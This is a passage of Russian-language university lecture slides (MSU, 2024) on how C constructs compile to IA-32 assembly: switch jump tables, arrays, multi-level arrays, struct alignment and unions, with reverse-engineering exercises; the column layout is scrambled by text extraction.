}                      таблице переходов       dd .L5 ; x = 2
                      2. Переход по адресу,    dd .L9 ; x = 3
switch_eg:               взятому из таблицы    dd .L8 ; x = 4
                                               dd .L7 ; x = 5
  push   ebp                          ;
                                               dd .L7 ; x = 6
  mov    ebp, esp                     ;

  mov     edx, dword [ebp + 8]        ; edx = x
  mov     eax, dword [ebp + 12]       ; eax = y
  mov     ecx, dword [ebp + 16]       ; ecx = z

  dec     edx       Косвенный
  cmp     edx, 5     переход          ; сравниваем (x-1) и 5
  ja      .L8                         ; если >u goto default
  jmp     [.L4 + 4*edx]               ; goto *JTab[x]               13
                                                          © 2024 МГУ/ВМК/СП


• Организация таблицы переходов
  – Каждый элемент занимает 4 байта
  – Базовый адрес - .L4                         Таблица переходов
                                         section .rodata align=4
                                         .L4:
                                            dd .L3 ; x = 1
• Переходы                                  dd .L5 ; x = 2
  – Прямые: jmp .L2                         dd .L9 ; x = 3
  – Для обозначения цели                    dd .L8 ; x = 4
    перехода используется метка .L2         dd .L7 ; x = 5
                                            dd .L7 ; x = 6
  – Косвенные: jmp [.L4 + 4*edx]
  – Начало таблицы переходов .L4
  – Коэффициент масштабирования должен быть 4
    (в IA-32 метка содержит 32 бита = 4 байта)
  – Выбираем цель перехода через исполнительный адрес
     .L4 + edx*4
    • Только для x: 0 ≤ x-1 ≤ 5                                  14
                                                 © 2024 МГУ/ВМК/СП




                          switch(x) {
                          case 1:      // .L3
                              w = y*z;
Таблица переходов             break;
section .rodata align=4   case 2:      // .L5
.L4:                          w = y/z;
   dd .L3 ; x = 1             /* «проваливаемся» */
   dd .L5 ; x = 2         case 3:      // .L9
   dd .L9 ; x = 3             w += z;
   dd .L8 ; x = 4             break;
   dd .L7 ; x = 5         case 5:
   dd .L7 ; x = 6         case 6:      // .L7
                              w -= z;
                              break;
                          default:     // .L8
                              w = 2;
                          }
                                                        15
                                                      © 2024 МГУ/ВМК/СП




long w = 1;
   . . .                    case 2:
switch(x) {                     w = y/z;
   . . .                        goto merge;
case 2:
    w = y/z;
    /* «проваливаемся» */                     case 3:
case 3:                                           w = 1;
    w += z;
                                              merge:
    break;
                                                  w += z;
   . . .
}




                                                             16
                                                    © 2024 МГУ/ВМК/СП




               Начало оператора switch

switch(x) {            .L3:              ; x == 1
case 1:       // .L3     imul eax, ecx   ; w = y*z;
  w = y*z;               jmp .L2         ; goto switch_end
  break;

 . . .

case 5:
case 6:       // .L7
  w -= z;
  break;
default:      // .L8
  w = 2;
}

                                                           17
                                                   © 2024 МГУ/ВМК/СП




          Продолжение оператора switch

switch(x) {
  . . .
  case 2:    // .L5     .L5:           ; x == 2
     w = y/z;             cdq          ;
  /* «проваливаемся»      idiv ecx     ; w = y/z;
     на точку слияния     jmp .L6      ; goto merge (.L6)
     .L6 */             .L9:           ; x == 3
  case 3:    // .L9       mov eax, 1   ; w = 1;
     w += z;            .L6:           ; точка слияния
     break;               add eax, ecx ; w += z;
  . . .                   jmp .L2      ; goto switch_end
}




                                                          18
                                                     © 2024 МГУ/ВМК/СП




              Окончание оператора switch

switch(x) {
case 1:       // .L3
  w = y*z;
  break;

 . . .

case 5:
case 6:       // .L7   .L7:               ; x == 5 или x == 6
  w -= z;                mov   eax, 1     ; w = 1;
  break;                 sub   eax, ecx   ; w -= z;
default:      // .L8     jmp   .L2        ; goto switch_end
  w = 2;               .L8:               ; default
}                        mov   eax, 2     ; w = 2
                       .L2:               ; выход из switch
                                                            19
                                                              © 2024 МГУ/ВМК/СП




                  Завершение функции
return w;                          pop ebp
                                   ret     ; возвращаемое
                                           ; значение уже
                                           ; размещено в EAX
• Преимущества таблицы переходов
  – Применение таблицы переходов позволяет избежать
    последовательного перебора значений меток
    • Фиксированное время работы
  – Позволяет учитывать «дыры» и повторяющиеся метки
  – Код располагается упорядоченно, удобно обрабатывать «пропуски»
  – Инициализация w = 1 не проводилась до тех пор пока не
    потребовалась


                                                                     20
© 2024 МГУ/ВМК/СП




       21
                                                     © 2024 МГУ/ВМК/СП
int f(int n, int *p) {
   int _res;                • Случай default
   switch (n) {
   default:                   расположен первым
      _res = 0;
   /* «проваливаемся» */
   case 1:                  • Управление
      *p = _res;              «проваливается» в
      break;
   case 64:
                              случаях default и 63
      _res = 1;
      break;
   case 63:                 • Таблица переходов
      _res = 2;               получается неприемлемо
      *p = _res;
                              большой
    /* «проваливаемся» */
   case 256:
      _res = 3;
      break;
   case 65536:
      _res = 4;
   }
   return _res;                                             22
}
                    © 2024 МГУ/ВМК/СП


...
push ebp
mov ebp, esp
mov eax, 1
mov edx, dword [ebp+8] ; n
cmp edx, 64
je   .L9
jle .L13
...




                           23
                                                                  © 2024 МГУ/ВМК/СП




                            Обратная задача
int switchMeOnce(int x) {        section .text
   int result = 0;                  . . .
                                    mov eax, dword [ebp-8]
     switch (x) {                   add eax, 2
     . . .                          cmp eax, 6
     }                              ja .L2
                                    jmp [.L8 + 4*eax]
     return result;                 . . .
}
                                 section .rodata
                                   .L8 dd .L3, .L2, .L4, .L5, .L6, .L6, .L7



    1.   Сколько раз было использовано ключевое слово case?
    2.   Какие константы использовались?
    3.   Какие ветки выполнения были объединены?
    4.   Что помечено .L2?                                               24
                                                              © 2024 МГУ/ВМК/СП



  Промежуточные итоги: передача управления
• Язык Cи
  – if, if-else
  – do-while
  – while, for
  – switch
• Язык ассемблера
  – Условная передача управления
  – Условная передача данных
  – Косвенные переходы
• Стандартные приемы
  – Преобразования циклов к виду do-while
  – Использование таблицы переходов для операторов switch
  – Операторы switch с «разреженным» набором значений меток
    реализуются деревом решений
• Следующая тема: указатели и агрегатные типы данных                 25
                                                        © 2024 МГУ/ВМК/СП




              Типы данных языка Си

• char                      • Типы чисел с плавающей
• Стандартные знаковые        точкой
  целочисленные типы           – float
   – signed char               – double
   – short int                 – long double
   – int                       – _Complex
   – long int               • Производные типы
   – long long int             – Массивы
• Стандартные беззнаковые      – Структуры
  целочисленные типы           – Объединения
   – _Bool                     – Указатели
• Перечисление                 – Указатели на функции


                                                               26
                                                                                  © 2024 МГУ/ВМК/СП




         Регистры и скалярные типы данных

• Переменные размещаются в памяти
   – Статическая память (секции  сегменты), автоматическая память (стек),
     динамическая память (библиотечные функции malloc, free, …)
   – При возможности оптимизирующий компилятор может разместить
     переменную в регистре
• Целые числа, перечисление
  – Обрабатываются на регистрах общего назначения
  – Знаковые/беззнаковые числа
     • Intel                 Асм.        байты        Си
      • byte                 b          1             [unsigned] char
      • word                 w          2             [unsigned] short
      • double word          d          4             [unsigned] int
      • quad word            q          8             [unsigned] long long int
• Указатели
• Числа с плавающей точкой
  – Обрабатываются на специализированных регистрах для чисел с плавающей точкой
     • Intel                Асм.       байты          Си
      • Single               d          4             float
      • Double               q          8             double

                                                                                         27
                                                  © 2024 МГУ/ВМК/СП




            Указатели, статическая память
                            p_i       p_c

static int *p_i;        …                     …
static char *p_c;



*p_с;                  mov eax, dword [p_c]
                       mov al, byte [eax]



&p_i;                  mov eax, p_i




                                                         28
                                                         © 2024 МГУ/ВМК/СП




         Указатели, автоматическая память

                                Адрес возврата
int f() {
                         EBP         EBP’
   int* tmp;
   …                                    tmp
}

&tmp;                mov eax, ebp             lea eax, [ebp-4]
                     sub eax, 4



*tmp;                mov eax, [ebp-4]
                     mov eax, [eax]




                                                                29
                                                              © 2024 МГУ/ВМК/СП




         Массивы – размещение в памяти

T A[L];
• Массив элементов типа T, размер массива – L
• Массив располагается в непрерывном блоке памяти
  размером L * sizeof(T) байт

char string[12];

                   x               x + 12
     int val[5];

                   x   x+4   x+8   x + 12   x + 16   x + 20
   double a[3];

                   x         x+8            x + 16             x + 24
    char *p[3];
                                                                     30
                   x   x+4   x+8   x + 12
                                                                                  © 2024 МГУ/ВМК/СП




            Доступ к элементам массива

T   A[L];
• Массив элементов типа T, размер массива – L
• Идентификатор A может использоваться как
  указатель на элемент массива с индексом 0. Тип
  указателя – T*
• Смещение пересчитывается из числа элементов в
  число байт
     int val[5];       1         5         2            1            3
                   x       x+4       x+8       x + 12       x + 16       x + 20

• A[i]  *(A+i)
                                                                                         31
                                                                   © 2024 МГУ/ВМК/СП




                               Задачи …
int E[N];           База – EDX, i – ECX,
static int *p;      значение выражения отправляем в EAX
short S[M];         Обозначения: A – адрес A, M[…] – обращение к памяти
Выражение   Тип           Значение           Ассемблерный код
E           int*          E                 MOV EAX, EDX
E[0]        int           M[E]              MOV EAX, [EDX]
E[i]        int           M[E+4*i]          MOV EAX, [EDX+4*ECX]
p           int*          M[p]              MOV EAX, [p]
S+1         short*        S+2               LEA EAX, [EDX+2]
S[3]        short         M[S+6]            MOV EAX, [EDX+6]
&S[i]       short*        E+2*i             LEA EAX, [EDX+2*ECX]
S[4*i+1]    short         M[S+8*i+2]        MOV EAX, [EDX+8*ECX+2]
S+i-5       short*        S+2*i-10          LEA EAX, [EDX+2*ECX-10]
&E[i]-E     ptrdiff_t     i                  MOV EAX, ECX
                                                                          32
                                                                     © 2024 МГУ/ВМК/СП

   #define ZLEN 5
   typedef int zip_dig[ZLEN];

   zip_dig cmu = { 1, 5, 2, 1, 3 };
   zip_dig mit = { 0, 2, 1, 3, 9 };
   zip_dig ucb = { 9, 4, 7, 2, 0 };

    zip_dig cmu;        1        5        2        1        3
                   16       20       24       28       32       36
    zip_dig mit;        0        2        1        3        9
                   36       40       44       48       52       56
    zip_dig ucb;        9        4        7        2        0
                   56       60       64       68       72       76

• Объявление переменной “zip_dig cmu” эквивалентно “int cmu[5]”
• Массивы были размещены в последовательно идущих блоках памяти
  размером 20 байт каждый
   – В общем случае не гарантируется, что массивы будут размещены непрерывно
                                                                            33
                                                                     © 2024 МГУ/ВМК/СП




  zip_dig cmu;        1        5        2        1         3
                 16       20       24       28        32       36



int get_digit (zip_dig z, int dig) {
                                                      Регистр edx
   return z[dig];
}                                                     содержит начальный
                                                      (базовый) адрес
                                                      массива
                                                      Регистр eax
 ; edx = z                                            содержит индекс
 ; eax = dig                                          элемента в массиве
 mov eax, dword [edx+4*eax] ; z[dig]
                                                      Адрес элемента
                                                      edx + 4 * eax

                                                                            34
                                                              © 2024 МГУ/ВМК/СП

void zincr(zip_dig z) {
  int i;
  for (i = 0; i < ZLEN; i++)
    z[i]++;
}

                 void zincr_v(zip_dig z) {
                   void *vz = z;
                   int i = 0;
                   do {
                     (*((int *) (vz + i))) += 1;
                     i += ISIZE;
                   } while (i != ISIZE * ZLEN);
                 }

                                      ;   edx = z
         mov eax, 0                   ;   eax = i
      .L4:                            ; loop:
         add dword [edx + 4 * eax], 1 ;   z[i]++
         add eax, 1                   ;   i++
         cmp eax, 5                   ;   i vs. 5
         jne .L4                      ;   if (!=) goto loop          35
                                                              © 2024 МГУ/ВМК/СП




              Массивы: две обратные задачи

f:                                     _____________ a[N];
     ...                               _____________ b[N];
     mov   edx, dword [ebp + 8]
     movsx ax, byte [a + edx]          void f(________ i) {
     mov   word [b + edx + edx], ax       ______________;
     ...                               }




g:                                     _____________ c[N];
     ...                               _____________ d[N];
     mov   edx, dword [ebp + 8]
     movzx eax, word [c + edx + edx]   void g(________ i) {
     mov   byte [d + edx], al             ______________;
     ...                               }

                                                                     36
           © 2024 МГУ/ВМК/СП




Лекция 9


 6 марта
                                                              © 2024 МГУ/ВМК/СП

#define PCOUNT 4
zip_dig pgh[PCOUNT] =
  {{1, 5, 2, 0, 6},
   {1, 5, 2, 1, 3 },
   {1, 5, 2, 1, 7 },
   {1, 5, 2, 2, 1 }};


zip_dig
           1 5 2 0 6 1 5 2 1 3 1 5 2 1 7 1 5 2 2 1
pgh[4];

          76            96       116          136           156

• “zip_dig pgh[4]” эквивалентно “int pgh[4][5]”
   – Переменная pgh: массив из 4 элементов, расположенных
     непрерывно в памяти
   – Каждый элемент – массив из 5 int’ов, расположенных
     непрерывно в памяти
• Всегда развертывание по строкам (Row-Major)
                                                                      2
                                                                           © 2024 МГУ/ВМК/СП


• Объявление                                 A[0][0]      • • •      A[0][C-1]
      T    A[R][C];
                                                  •                        •
      – 2D массив элементов типа T
                                                  •                        •
      – R строк, C столбцов                       •                        •
      – Размер типа T – K байт
                                             A[R-1][0]    • • •    A[R-1][C-1]
• Размер массива
      – R * C * K байт
• Размещение в памяти
      – Развертывание по строкам



int A[R][C];

 A                A    A              A                      A                   A
[0]     • • •    [0] [1]    • • •    [1]      •   •   •    [R-1]   • • •       [R-1]
[0]             [C-1] [0]           [C-1]                   [0]                [C-1]

                             4*R*C    байт                                         3
                                                                            © 2024 МГУ/ВМК/СП



• Доступ к строкам
   – A[i] массив из C элементов
      – Каждый элемент типа T требует K байт
      – Начальный адрес строки с индексом i
        A + i * (C * K)


    int A[R][C];

          A[0]                            A[i]                           A[R-1]

     A              A                A              A              A                A
    [0]   • • •    [0] •   •   •    [i]   • • •    [i] •   •   • [R-1]   • • •    [R-1]
    [0]           [C-1]             [0]           [C-1]           [0]             [C-1]


A                                  A+i*C*4                      A+(R-1)*C*4

                                                                                    4
                                                           © 2024 МГУ/ВМК/СП



int *get_pgh_zip(int index){           #define PCOUNT 4
  return pgh[index];                   zip_dig pgh[PCOUNT] =
}                                        {{1, 5, 2, 0, 6},
                                          {1, 5, 2, 1, 3 },
                                          {1, 5, 2, 1, 7 },
                                          {1, 5, 2, 2, 1 }};


    ; eax = index
     lea eax, [eax + 4 * eax] ; 5 * index
     lea eax, [pgh + 4 * eax] ; pgh + (20 * index)




     – pgh[index] массив из 5 int’ов
     – Начальный адрес pgh+20*index

     – Вычисляется и возвращается адрес
     – Вычисление адреса в виде pgh + 4*(index+4*index)            5
                                                                          © 2024 МГУ/ВМК/СП



• Элементы массива
          – A[i][j] элемент типа T, который требует K байт
          – Адрес элемента A + i * (C * K) + j * K = A + (i * C + j)* K




    int A[R][C];

            A[0]                           A[i]                       A[R-1]

     A                A                     A                   A                A
    [0]     • • •    [0] •   •    •        [i]      •   •   • [R-1]   • • •    [R-1]
    [0]             [C-1]                  [j]                 [0]             [C-1]


A                                A+i*C*4                    A+(R-1)*C*4

                                                                                  6
                                      A+i*C*4+j*4
                                                            © 2024 МГУ/ВМК/СП



int get_pgh_digit (int index, int dig) {
  return pgh[index][dig];
}



 mov     eax, dword [ebp + 8]         ; index
 lea     eax, [eax + 4 * eax]         ; 5*index
 add     eax, dword [ebp + 12]        ; 5*index+dig
 mov     eax, dword [pgh + 4 * eax]   ; смещение 4*(5*index+dig)



  – pgh[index][dig] – тип int
  – Адрес: pgh + 20*index + 4*dig =
                         = pgh + 4*(5*index + dig)

  – Вычисление адреса производится как
       pgh + 4*((index+4*index)+dig)
                                                                    7
                                                                       © 2024 МГУ/ВМК/СП


zip_dig cmu = { 1, 5, 2, 1, 3 };                • Переменная univ
zip_dig mit = { 0, 2, 1, 3, 9 };                  представляет собой
zip_dig ucb = { 9, 4, 7, 2, 0 };                  массив из 3 элементов
#define UCOUNT 3                                • Каждый элемент –
int *univ[UCOUNT] = {mit, cmu, ucb};              указатель
                                                  (размером 4 байта)
                                                • Каждый указатель
                                                  ссылается на массив из
                                                  int’ов


                       cmu
                                   1        5        2        1        3
          univ
                              16       20       24       28       32         36
  160     36            mit
                                   0        2        1        3        9
 164      16
 168      56           ucb 36          40       44       48       52         56
                                   9        4        7        2        0
                              56       60       64       68       72         76
                                                                               8
                                                             © 2024 МГУ/ВМК/СП



int get_univ_digit (int index, int dig) {
  return univ[index][dig];
}



 mov    eax, dword [ebp + 8]                ; index
 mov    edx, dword [univ + 4 * eax]         ; p = univ[index]
 mov    eax, dword [ebp + 12]               ; dig
 mov    eax, dword [edx + 4 * eax]          ; p[dig]


   – Доступ к элементу Mem[Mem[univ+4*index]+4*dig]
   – Необходимо выполнить два чтения из памяти
       • Первое чтение получает указатель на одномерный массив
       • Затем второе чтение выполняет выборку требуемого элемента
         этого одномерного массива


                                                                     9
                                                       © 2024 МГУ/ВМК/СП




Многомерный массив           Многоуровневый массив
int get_pgh_digit             int get_univ_digit
  (int index, int dig)          (int index, int dig)
{                             {
  return pgh[index][dig];       return univ[index][dig];
}                             }




           •Значительное внешнее сходство в Си
           •Существенное различие в ассемблере


Mem[pgh+20*index+4*dig]       Mem[Mem[univ+4*index]+4*dig]
                                                              10
                                                               © 2024 МГУ/ВМК/СП



Матрица N × N                 #define N 16
                              typedef int fix_matrix[N][N];
• Фиксированные               /* Get element a[i][j] */
  размерности                 int fix_ele
   – Значение N известно во     (fix_matrix a, int i, int j)
     время компиляции         {
                                return a[i][j];
                              }
• Динамически задаваемая
  размерность. Требуется      #define IDX(n, i, j) ((i)*(n)+(j))
  явное преобразование        /* Get element a[i][j] */
  индексов                    int vec_ele
   – Традиционный способ       (int n, int *a, int i, int j)
     реализации               {
     динамических массивов      return a[IDX(n,i,j)];
                              }

• Динамически задаваемая      /* Get element a[i][j] */
  размерность с неявной       int var_ele
  индексацией.                 (int n, int a[n][n], int i, int j) {
                                return a[i][j];
   – Поддерживается
                              }                                 11
     актуальными версиями
     gcc
                                                          © 2024 МГУ/ВМК/СП




                       Матрица 16 × 16
   Доступ к элементу матрицы
     Адрес A + i * (C * K) + j * K
     C = 16, K = 4

     /* Получение элемента a[i][j] */
     int fix_ele(fix_matrix a, int i, int j) {
       return a[i][j];
     }


        mov    edx, dword [ebp + 12]     ; i
        sal    edx, 6                    ; i*64
        mov    eax, dword [ebp + 16]     ; j
        sal    eax, 2                    ; j*4
        add    eax, dword [ebp + 8]      ; a + j*4
        mov    eax, dword [eax + edx]    ; *(a + j*4 + i*64)

                                                                 12
                                                           © 2024 МГУ/ВМК/СП




                         Матрица n × n
   Доступ к элементу матрицы              sizeof(a) = ?
     Адрес A + i * (C * K) + j * K        sizeof(a[i]) = ?
     C = n, K = 4
    /* Получение элемента a[i][j] */
    int var_ele(int n, int a[n][n], int i, int j) {
      return a[i][j];
    }

      mov     edx, dword [ebp + 8]      ; n
      sal     edx, 2                    ; n*4
      imul    edx, dword [ebp + 16]     ; i*n*4
      mov     eax, dword [ebp + 20]     ; j
      sal     eax, 2                    ; j*4
      add     eax, dword [ebp + 12]     ; a + j*4
      mov     eax, dword [eax + edx]    ; *(a + j*4 + i*n*4)

                                                                  13
                                                             © 2024 МГУ/ВМК/СП



    Оптимизация доступа к элементам массива
a          j-ый столбец
                                 #define N 16
                                 typedef int fix_matrix[N][N];

                                /* Выборка столбца j из массива */
•   Вычисления                  void fix_column
     – Проход по всем элементам   (fix_matrix a, int j, int *dest)
       в столбце j              {
                                  int i;
•   Оптимизация                   for (i = 0; i < N; i++)
     – Выборка                      dest[i] = a[i][j];
       последовательных         }
       элементов из отдельного
       столбца


                                                                    14
                                                            © 2024 МГУ/ВМК/СП



    Оптимизация доступа к элементам массива
• Оптимизация                /* Выборка столбца j из массива */
  – Вычисляем ajp = &a[i][j] void fix_column
      • Начальное значение     (fix_matrix a, int j, int *dest)
        a + 4*j              {
      • Шаг 4*N                int i;
                               for (i = 0; i < N; i++)
  Регистр      Значение          dest[i] = a[i][j];
  ecx          ajp           }
  ebx        dest
  edx        i

 .L8:                                       ; loop:
    mov   eax, dword [ecx]                  ; считываем *ajp
    mov   dword [ebx + 4 * edx], eax        ; сохраняем в dest[i]
    add   edx, 1                            ; i++
    add   ecx, 64                           ; ajp += 4*N
    cmp   edx, 16                           ; i vs. N
    jne   .L8                               ; if !=, goto loop 15
                                                              © 2024 МГУ/ВМК/СП



   Оптимизация доступа к элементам массива
   – Вычисляем ajp = &a[i][j]
         • Начальное значение    /* Выборка столбца j из массива */
           a + 4*j               void var_column
         • Шаг 4*n                 (int n, int a[n][n],
                                    int j, int *dest)
     Регистр         Значение    {
                                   int i;
     ecx             ajp
                                   for (i = 0; i < n; i++)
     edi             dest            dest[i] = a[i][j];
     edx             i           }
     ebx             4*n
     esi             n

.L18:                                         ; loop:
   mov      eax, dword [ecx]                  ; считываем *ajp
   mov      dword [edi + 4 * edx], eax        ; сохраняем в dest[i]
   add      edx, 1                            ; i++
   add      ecx, ebx                          ; ajp += 4*n
   cmp      esi, edx                          ; n vs. i
                                                                  16
   jg       .L18                              ; if (>) goto loop
                                                               © 2024 МГУ/ВМК/СП



   Оптимизация доступа к элементам массива

– Изменение направления      /* Выборка столбца j из массива */
                             void var_column
  прохода по циклу             (int n, int a[n][n],
   • Выход из цикла по          int j, int *dest) {
     нулевому счетчику
                                 int i;
   • Шаг отрицательный
                                 for (i = n-1; i >=0; i--) {
   • Меняются начальные            dest[i] = a[i][j];
     значения указателей         }
   • Достаточно вывести к    }
     нулю один из индексов

.L18:                                       ; loop:
   mov   eax, dword [ecx]                   ; считываем *ajp
   mov   dword [edi + 4 * edx], eax         ; сохраняем в dest[i]
   add   edx, 1                             ; i++
   add   ecx, ebx                           ; ajp += 4*n
   cmp   esi, edx                           ; n vs. i
                                                                17
   jg    .L18                               ; if (>) goto loop
                                                              © 2024 МГУ/ВМК/СП



      Оптимизация доступа к элементам массива
                               /* Выборка столбца j из массива */
Регистр   Начальное значение   void var_column
                                 (int n, int a[n][n],
ecx       a+4*n*(n-1)+4*j         int j, int *dest) {
edi       dest – 4
edx       n                        int i;
                                   dest--;
ebx       4*n                      for (i = n; i != 0; i--)
esi       освободился                dest[i] = a[i-1][j];
                               }


.L18:                                         ; loop:
   mov    eax, dword [ecx]                    ; считываем *(ajp+…)
   mov    dword [edi + 4 * edx], eax          ; сохраняем в dest[i]
   sub    ecx, ebx                            ; ajp -= 4*n
   sub    edx, 1                              ; i--
   jnz    .L18                                ; if (!=) goto loop
                                                                     18
                                                           © 2024 МГУ/ВМК/СП




                    Обратная задача
                        ; пролог функции пропущен
                       mov     edx, dword [ebp+12]
                       mov     eax, edx
                       sal     eax, 4
                       add     eax, edx
                       imul    edx, dword [ebp+8], 221
                       add     eax, edx
                       add     eax, dword [ebp+16]
                       movsx   eax, word [array+eax+eax]
                       ; эпилог функции пропущен



_____ array[__][__][__];

_____ f(int i, int j, int k) {
    return array[i][j][k];
}
                                                                  19
                                                        © 2024 МГУ/ВМК/СП



              Типы данных языка Си
                     Далее
• char                      • Типы чисел с плавающей
• Стандартные знаковые        точкой
  целочисленные типы           – float
   – signed char               – double
   – short int                 – long double
   – int                       – _Complex
   – long int               • Производные типы
   – long long int             – Массивы
• Стандартные беззнаковые      – Структуры
  целочисленные типы           – Объединения
   – _Bool                     – Указатели
• Перечисление                 – Указатели на функции


                                                               20
                                                   © 2024 МГУ/ВМК/СП




                     Структуры

struct rec {              • Непрерывный блок памяти
   int i;
   int j;                 • Обращение к полям структуры
   int a[3];                осуществляется по их именам
   struct rec *p;         • Поля могут быть разных типов
}


  Расположение в памяти




                                                          21
                                                      © 2024 МГУ/ВМК/СП




                      Доступ к полям

  struct rec {            • struct rec *x – указатель на
     int i;                 первый байт структуры
     int j;               • Каждое поле расположено на
     int a[3];
     struct rec *p;         определенном смещении от
  }                         начала структуры




static struct rec *x;      mov edx, dword [x]       ; (1)
...                        mov eax, dword [edx]     ; (2)
x->j = x->i;               mov dword [edx + 4], eax ; (3)
                                                             22
                                                     © 2024 МГУ/ВМК/СП




           Указатель на поле структуры

struct rec {        • Смещение каждого поля
   int i;             известно во время компиляции
   int j;
   int a[3];
                      static struct rec *x;
   struct rec *p;
                      static int i;
}
                      ...
                      &(x->a[i]);




mov edx, dword [i]           ; (1)
mov eax, dword [x]           ; (2)
lea eax, [eax + 4 * edx + 8] ; (3)                          23
                                                          © 2024 МГУ/ВМК/СП

• Проход по связанному списку              struct rec {
                                              int i;
void set_val (struct rec *r, int val) {       int j;
  while (r) {                                 int a[3];
    int i = r->i;                             struct rec *p;
    r->a[i] = val;                         }
    r = r->p;
  }                                       Регистр     Переменная
}                                         edx         r
                                          ecx         val



 r
.L17: ; цикл
   mov eax, [edx]               ; r->i
   mov [edx + 4 * eax + 8], ecx ; r->a[i] = val
   mov edx, [edx + 20]          ; r = r->p
   test edx, edx                ; r?
                                                                 24
   jne .L17                     ; If != 0 goto .L17
                                                                       © 2024 МГУ/ВМК/СП




            Выравнивание полей в структурах
                                                             struct S1 {
• Невыровненные данные                                         char c;
                                                               int i[2];
  c      i[0]         i[1]             v                       double v;
 p p+1          p+5          p+9                      p+17   } *p;

• Выровненные данные
  – Если примитивный тип данных требует K байт
  – Адрес должен быть кратен K
  c   3 байта      i[0]         i[1]   4 байта                v
p+0          p+4          p+8                   p+16                    p+24

           Кратно 4                        Кратно 8

Кратно 8                                                          Кратно 8    25
                                                                         © 2024 МГУ/ВМК/СП




            Почему выравнивают данные

• Выровненные данные
 – Размер примитивного типа данных K байт
 – Адрес должен быть кратен K
 – Для некоторых архитектур это требование обязательно должно
   выполняться
 – Для IA-32 требование к выравниванию имеет рекомендательный
   характер
    • Требования различаются для IA-32/x86-64, Linux/Windows
• Причины
 – Доступ к физической памяти осуществляется блоками (выровненными)
   по 4 или 8 байт (зависит от аппаратуры)
    • Эффективность теряется при обращении к данным, расположенным в двух блоках
    • Виртуальная память…
• Компилятор
 – Расставляет пропуски между полями для сохранения выравнивания


                                                                                26
                                                                      © 2024 МГУ/ВМК/СП



              Правила выравнивания (IA-32)
• 1 байт : char, …
  – Ограничений нет
• 2 байта : short, …
  – Младший бит адреса должен быть 02
• 4 байта : int, long, float, char *, …
  – Два младших бита адреса должны быть 002
• 8 байт : double, …
  – Windows ( и другие …):
     • Младшие три бита адреса должны быть 0002
  – Linux:
     • Два младших бита адреса должны быть 002
     • Т.е. рассматриваются как и 4-байтные примитивные типы данных
• 12 байт : long double (gcc)
  – Windows, Linux:
    • Два младших бита должны быть 002
    • Т.е. рассматриваются как и 4-байтные примитивные типы данных           27
                                                                        © 2024 МГУ/ВМК/СП



            Правила выравнивания (x86-64)
• 1 байт : char, …
                                        Тип long double в компиляторе MS VC
  – Ограничений нет
                                        • 16-разрядная архитектура
• 2 байта : short, …                         • sizeof(long double) = 10 // 80 бит
  – Младший бит адреса должен быть 02   • 32-разрядная архитектура и далее …
                                             • long double ≡ double
• 4 байта : int, float, …
  – Два младших бита адреса должны быть 002
• 8 байт: double, long, char *, …
  – Windows & Linux:
    • Младшие три бита адреса должны быть 0002
• 16 байт: long double
  – Linux:
     • Младшие три бита адреса должны быть 0002
     • Т.е. рассматриваются как и 8-байтные примитивные типы данных



                                                                               28
                                                                   © 2024 МГУ/ВМК/СП




  Выполнение правил выравнивания для полей
 • Внутри структуры                                      struct S1 {
    – Выравнивание должно выполняться                      char c;
      для каждого поля                                     int i[2];
                                                           double v;
 • Размещение всей структуры                             } *p;
    – Для каждой структуры определятся требование
      по выравниванию в K байт
        • K = Наибольшее выравнивание среди всех полей
    – Начальный адрес структуры и ее длина должны быть кратны K
 • Пример (для Windows или x86-64):
    – K = 8, из-за присутствия поля типа double

    c   3 байта    i[0]         i[1]   4 байта           v
 p+0         p+4          p+8                p+16                   p+24

           Кратно 4
Кратно 8                                Кратно 8             Кратно 8     29
                                                                       © 2024 МГУ/ВМК/СП




      Различные соглашения о выравнивании
                                                              struct S1 {
• x86-64 или IA-32 Windows:                                     char c;
 – K = 8, из-за наличия поля типа double                        int i[2];
                                                                double v;
                                                              } *p;
  c   3 байта     i[0]         i[1]          4 байта             v
p+0         p+4          p+8                           p+16                 p+24


• IA-32 Linux
 – K = 4; double рассматривается аналогично 4-байтным типам
   данных

  c   3 байта     i[0]         i[1]                     v
p+0         p+4          p+8          p+12                     p+20
                                                                              30
                                                   © 2024 МГУ/ВМК/СП




       Выравнивание всей структуры

                                         struct S2 {
                                           double v;
• Определяется требование к                int i[2];
                                           char c;
  выравниванию в K байт                  } *p;
• Общий размер структуры должен
  быть кратен K

       v            i[0]   i[1]     c     7 байт
p+0           p+8                 p+16                p+24




                                                          31
                                                                       © 2024 МГУ/ВМК/СП




                        Массивы структур
                                                             struct S2 {
• Размер всей структуры кратен K                               double v;
                                                               int i[2];
• Для каждого элемента массива                                 char c;
  производится выравнивание                                  } a[10];


                 a[0]             a[1]                a[2]             • • •
       a+0               a+24             a+48                a+72




             v                 i[0]      i[1]     c           7 байт
a+24                    a+32                    a+40                      a+48
                                                                              32
                                                                    © 2024 МГУ/ВМК/СП




             Доступ к элементам массива
 • Вычисляем смещение в массиве                           struct S3 {
                                                            short i;
   – Вычисляем sizeof(S3), учитывая пропуски
                                                            float v;
 • Вычисляем смещение внутри структуры                      short j;
   – Поле j расположено со смещением 8 внутри             } a[10];
     структуры
   a[0]                • • •         a[i]                 • • •
a+0           a+12               a+12i


                          i    2 байта      v         j   2 байта
                     a+12i                      a+12i+8
short get_j(int idx) {        ; eax = idx
  return a[idx].j;              lea eax, [eax + 2 * eax] ; 3*idx
}                               movsx eax, word [a + 4 * eax + 8]
                                                                           33
                                                     © 2024 МГУ/ВМК/СП




                     Как сохранить место

• Размещаем большие типы первыми
         struct S4 {                   struct S5 {
           char c;                       int i;
           int i;                        char c;
           char d;                       char d;
         } *p;                         } *p;

• Результат (K=4)
 c 3 байта       i         d 3 байта

     i       c d 2 байта

                                                            34
                                                                     © 2024 МГУ/ВМК/СП




                Размещение объединений
• Память выделяется исходя из размеров максимального
  элемента
• Используется только одно поле
  union U1 {
    char c;
    int i[2];                        c
    double v;                            i[0]          i[1]
  } *up;                                           v
  struct S1 {                    up+0           up+4          up+8
    char c;
    int i[2];
    double v;
  } *sp;
  c 3 байта     i[0]          i[1]       4 байта                 v
sp+0     sp+4          sp+8                     sp+16                 sp+24
                                                                            35
                                                             © 2024 МГУ/ВМК/СП




              Пример: двоичное дерево
typedef enum {N_LEAF, N_INTERNAL} nodetype_t;


struct NODE_T {
   nodetype_t type;
   union NODE_U {
      struct {
         struct NODE_T *left;
         struct NODE_T *right;
      } internal;
      double data;
   } info;
};


    sizeof(struct NODE_T) ?        Какие смещения у полей?

                        IA-32 Linux / IA-32 Windows                 37
                                                               © 2024 МГУ/ВМК/СП




